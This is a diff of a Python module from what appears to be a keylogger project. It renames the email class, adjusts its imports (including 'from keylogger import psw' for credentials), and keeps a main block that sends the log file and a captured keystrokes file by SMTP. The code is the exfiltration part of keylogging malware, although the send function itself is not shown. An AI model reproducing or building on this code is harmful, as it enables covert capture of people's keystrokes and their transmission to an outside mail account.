@@ -4,15 +4,15 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-from config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
+from .config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
 if DEBUG:
-    import psw
+    from keylogger import psw
 
-class Email:
+class SendEmail:
     def __init__(self) -> None:
         if DEBUG:
-            self.USERNAME = psw.email  # Your email login
-            self.PASSWORD = psw.psw  # Your email password
+            self.USERNAME = psw.email
+            self.PASSWORD = psw.psw
         else:
             self.USERNAME = USERNAME
             self.PASSWORD = PASSWORD
@@ -55,7 +55,7 @@ class Email:
 
 
 if __name__ == "__main__" and DEBUG:
-    app = Email()
+    app = SendEmail()
     app.send_email(
         "./LOGS/logs.log",
         "./LOGS/keystrokes.txt",
